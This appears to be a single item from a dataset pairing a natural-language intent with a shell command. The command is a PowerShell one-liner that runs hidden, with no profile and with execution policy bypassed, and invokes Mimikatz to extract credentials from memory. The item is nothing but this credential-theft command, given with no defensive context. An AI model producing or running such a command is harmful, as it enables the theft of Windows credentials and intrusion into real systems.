# Natural language intent:
# Execute PowerShell with specific settings to invoke Mimikatz, a tool for extracting credentials from memory.

powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-Mimikatz"
